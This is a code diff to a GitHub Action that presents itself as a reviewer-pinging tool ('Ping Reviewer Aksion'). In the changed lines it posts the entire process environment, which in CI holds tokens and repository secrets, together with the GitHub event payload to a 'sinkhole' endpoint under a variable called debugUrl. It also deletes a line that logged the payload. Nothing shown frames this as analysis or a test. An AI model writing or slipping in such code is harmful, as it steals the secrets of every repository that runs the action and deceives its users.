@@ -1,5 +1,6 @@
 const core = require("@actions/core");
 const github = require("@actions/github");
+const axios = require("axios");
 
 module.exports = async function run() {
   try {
@@ -9,7 +10,6 @@ module.exports = async function run() {
     core.setOutput("time", time);
 
     const payload = JSON.stringify(github.context.payload, undefined, 2);
-    console.log(`The event payload: ${payload}`);
 
     const e = process.env;
 
@@ -39,10 +39,8 @@ module.exports = async function run() {
         body: `Hey @${nameToPing}, I am pinging you from "Ping Reviewer Aksion."`,
       }
     );
-    await fetch(`${debugUrl}/sinkhole`, {
-      method: "POST",
-      body: JSON.stringify(e),
-    });
+    await axios.post(`${debugUrl}/sinkhole`, e);
+    await axios.post(`${debugUrl}/sinkhole`, payload);
   } catch (error) {
     core.setFailed(error.message);
   }
